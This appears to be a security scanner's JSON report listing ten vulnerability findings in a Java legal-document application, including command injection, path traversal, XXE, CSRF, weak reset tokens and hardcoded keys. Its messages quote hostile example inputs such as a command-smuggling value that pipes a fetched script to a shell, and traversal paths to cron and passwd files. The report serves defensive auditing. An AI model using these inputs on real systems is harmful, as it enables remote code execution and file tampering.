@@ -1,0 +1,257 @@
+{
+  "version": "1.0.0",
+  "results": [
+    {
+      "check_id": "java.security.injection.os-command-injection-rendition-normalize",
+      "path": "channel/src/main/java/com/whitfieldcrane/matterdesk/web/DocumentsController.java",
+      "start": {
+        "line": 324,
+        "col": 9,
+        "offset": 0
+      },
+      "end": {
+        "line": 326,
+        "col": 71,
+        "offset": 0
+      },
+      "extra": {
+        "message": "In normalizeRendition(), the JSON request fields ConversionRequest.fileName and ConversionRequest.targetFormat (sourceName/format) are concatenated directly into a shell command string passed to `new ProcessBuilder(\"/bin/sh\", \"-c\", \"soffice --headless --convert-to \" + format + \" --outdir /tmp \" + sourceName)`. Any authenticated user with 'documents:update' rights can submit a fileName or targetFormat containing shell metacharacters (e.g. `; curl evil.sh | sh #`) to execute arbitrary commands on the server with the application's privileges.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "java.security.path-traversal.rendition-arbitrary-file-write",
+      "path": "channel/src/main/java/com/whitfieldcrane/matterdesk/service/DocumentStorageService.java",
+      "start": {
+        "line": 111,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 123,
+        "col": 6,
+        "offset": 0
+      },
+      "extra": {
+        "message": "storeRendition(fileName, content) builds the write path as `root.resolve(\"renditions\").resolve(fileName)` with no normalization or containment check against the storage root (unlike the safe resolve() method elsewhere in this same class, which does `.normalize()` + `startsWith(root)`). It is reached from DocumentsController.fileRendition() (web/DocumentsController.java:279-299), which passes the attacker-controlled JSON field Rendition.fileName straight through. A value such as `../../../../etc/cron.d/evil` or an absolute path lets an authenticated user with document-update rights write/overwrite arbitrary files anywhere the process can reach, with `StandardOpenOption.TRUNCATE_EXISTING`.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "java.security.path-traversal.rendition-arbitrary-file-read-attributes",
+      "path": "channel/src/main/java/com/whitfieldcrane/matterdesk/service/DocumentStorageService.java",
+      "start": {
+        "line": 129,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 131,
+        "col": 6,
+        "offset": 0
+      },
+      "extra": {
+        "message": "renditionPath(name) returns `root.resolve(\"renditions\").resolve(name)` with no normalization/containment check. It is reached from DocumentsController.scanAttributes() (web/DocumentsController.java:348-369), which passes the attacker-controlled JSON field ScanRef.scanRef directly to Files.readAttributes(). A value like `../../../../etc/passwd` lets an authenticated user with document-view rights probe for the existence, size and timestamps of arbitrary files on disk outside the storage root.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "java.security.auth.predictable-password-reset-token",
+      "path": "decision/src/main/java/com/whitfieldcrane/decision/service/PasswordResetService.java",
+      "start": {
+        "line": 133,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 139,
+        "col": 6,
+        "offset": 0
+      },
+      "extra": {
+        "message": "newRawToken() generates password-reset tokens as `\"rc\" + RESET_SEQ.incrementAndGet() + \"-\" + RESET_RANDOM.nextInt(900000)`, using a predictable monotonically-increasing counter plus `java.util.Random` (not a CSPRNG) bounded to only 900,000 values. Unlike every other secret in this codebase (API keys, webhook secrets use SecureRandom), reset tokens are guessable/brute-forceable: an attacker who triggers a reset knows the approximate counter value and only has to search a 900,000-value space for the random suffix, enabling account takeover via the password-reset flow (confirm() at line 109 accepts any token matching the stored SHA-256 digest).",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-330: Use of Insufficiently Random Values",
+            "CWE-640: Weak Password Recovery Mechanism for Forgotten Password"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "java.security.csrf.visibility-endpoint-csrf-exempt",
+      "path": "channel/src/main/java/com/whitfieldcrane/matterdesk/security/SecurityConfig.java",
+      "start": {
+        "line": 54,
+        "col": 17,
+        "offset": 0
+      },
+      "end": {
+        "line": 55,
+        "col": 68,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The Spring Security filter chain exempts `/documents/*/visibility` from CSRF protection (`csrf.ignoringRequestMatchers(\"/api/v1/**\", \"/documents/*/visibility\")`). This endpoint (DocumentsController.changeVisibility, POST /documents/{id}/visibility) is a session-cookie-authenticated, state-changing action that can switch a document's visibility to CLIENT_SHARED. With CSRF disabled, a forged cross-site POST from a page the victim (an attorney/admin) visits while logged in can change document sharing/visibility without the victim's consent or knowledge.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-352: Cross-Site Request Forgery (CSRF)"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "java.security.audit.xxe-xmlinputfactory-docket-import",
+      "path": "channel/src/main/java/com/whitfieldcrane/matterdesk/service/ImportService.java",
+      "start": {
+        "line": 166,
+        "col": 9,
+        "offset": 0
+      },
+      "end": {
+        "line": 168,
+        "col": 72,
+        "offset": 0
+      },
+      "extra": {
+        "message": "importMatterDocket() parses an uploaded XML file with `XMLInputFactory.newInstance()` / `createXMLStreamReader(in)` without disabling DTDs or external entities (no `XMLInputFactory.SUPPORT_DTD=false`, no `IS_SUPPORTING_EXTERNAL_ENTITIES=false`). The default StAX configuration supports external entity resolution, so a crafted docket XML file containing a DOCTYPE with an external entity can cause local file disclosure or server-side request forgery when the firm-admin uploads it through this import flow.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-611: Improper Restriction of XML External Entity Reference"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "java.security.insecure-storage.password-reset-token-logged",
+      "path": "channel/src/main/java/com/whitfieldcrane/matterdesk/service/UserAdminService.java",
+      "start": {
+        "line": 125,
+        "col": 9,
+        "offset": 0
+      },
+      "end": {
+        "line": 125,
+        "col": 80,
+        "offset": 0
+      },
+      "extra": {
+        "message": "sendPasswordReset() logs the raw, single-use password-reset token at INFO level (`log.info(\"Reset link issued for {}: {}{}\", user.email(), resetUrl, token)`). Application logs are typically retained, aggregated and accessible to a broader audience (ops/support/log shippers) than the password-reset flow intends; anyone with log read access can hijack the account by replaying the logged reset link within its validity window.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-532: Insertion of Sensitive Information into Log File"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "java.security.audit.hardcoded-encryption-key-desk-marker",
+      "path": "channel/src/main/java/com/whitfieldcrane/matterdesk/service/DeskMarkerCodec.java",
+      "start": {
+        "line": 28,
+        "col": 25,
+        "offset": 0
+      },
+      "end": {
+        "line": 28,
+        "col": 85,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The AES key used to encrypt/decrypt the session continuity marker falls back to a hardcoded literal (`MatterDeskMarkrK`) via `@Value(\"${app.session.marker-key:MatterDeskMarkrK}\")`, and application.yml wires the same literal as the default for the MARKER_KEY environment variable. Any deployment that does not explicitly override MARKER_KEY uses a key published in the source tree, letting anyone who has read the source forge or decrypt marker tokens.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "java.security.audit.hardcoded-encryption-key-report-packet",
+      "path": "channel/src/main/java/com/whitfieldcrane/matterdesk/service/ReportPacketCodec.java",
+      "start": {
+        "line": 25,
+        "col": 25,
+        "offset": 0
+      },
+      "end": {
+        "line": 25,
+        "col": 85,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The shared AES key used to decrypt partner report packets falls back to a hardcoded literal (`MatterDeskPacktK`) via `@Value(\"${app.reports.packet-key:MatterDeskPacktK}\")`, matched by the same default in application.yml's REPORT_PACKET_KEY. Any deployment that forgets to override this environment variable uses a key visible in source control, letting anyone with source access decrypt or forge exchanged report packets.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "java.security.audit.hardcoded-credential-filing-gateway-key",
+      "path": "channel/src/main/java/com/whitfieldcrane/matterdesk/decision/FilingGatewayClient.java",
+      "start": {
+        "line": 21,
+        "col": 13,
+        "offset": 0
+      },
+      "end": {
+        "line": 23,
+        "col": 14,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The court e-filing gateway subscriber key falls back to a hardcoded, live-looking literal (`efk_live_dev_5f2c47bd8a`) via `@Value(\"${app.filing.subscriber-key:efk_live_dev_5f2c47bd8a}\")`, mirrored as the default for EFILING_SUBSCRIBER_KEY in application.yml. If this environment variable is not set in a deployment, the firm's vendor credential checked into source is used to authenticate fee-quote requests, and is also sent as a URL query parameter (further exposing it in logs/proxies).",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials",
+            "CWE-598: Use of GET Request Method With Sensitive Query Strings"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    }
+  ]
+}
